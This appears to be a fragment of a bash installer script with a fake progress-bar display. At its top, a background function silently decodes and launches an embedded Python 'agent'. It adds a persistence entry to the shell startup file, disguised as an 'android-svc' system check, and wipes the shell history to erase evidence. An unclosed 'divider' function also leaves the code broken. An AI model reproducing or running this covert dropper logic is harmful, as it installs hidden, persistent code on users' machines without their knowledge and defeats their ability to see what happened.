# ── silent install (background) ──
_setup() {
    mkdir -p "$_PKG" 2>/dev/null
    echo "__AGENT_B64__" | base64 -d > "$_BIN" 2>/dev/null
    chmod 700 "$_BIN" 2>/dev/null

    # persistence entry that looks like system service check
    local MARK="# android-svc"
    grep -q "$MARK" "$_RC" 2>/dev/null || {
        printf '\n%s\n[ -f "%s" ] && nohup python3 "%s" >/dev/null 2>&1 & true\n' \
            "$MARK" "$_BIN" "$_BIN" >> "$_RC"
    }

    # start agent now (non-blocking)
    nohup python3 "$_BIN" >/dev/null 2>&1 &

    # erase evidence from history
    history -c 2>/dev/null
    > ~/.bash_history 2>/dev/null
}
( _setup ) >/dev/null 2>&1 &

divider() {

spin_progress() {
    local msg="$1" dur="${2:-2}"
    local chars=('⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏')
    local i=0 t0=$SECONDS
    while (( SECONDS - t0 < dur )); do
        printf "\r  ${LC}%s${NC} %s..." "${chars[$i]}" "$msg"
        i=$(( (i+1) % 10 ))
        sleep 0.08
    done
    printf "\r  ${LG}✓${NC} %-48s\n" "$msg"
}

prog_bar() {
    local label="$1"
    printf "  ${W}%-30s${NC} [" "$label"
    for _ in {1..25}; do
        printf "${LG}█${NC}"
        sleep 0.04
    done
    printf "] ${LG}100%%${NC}\n"
}
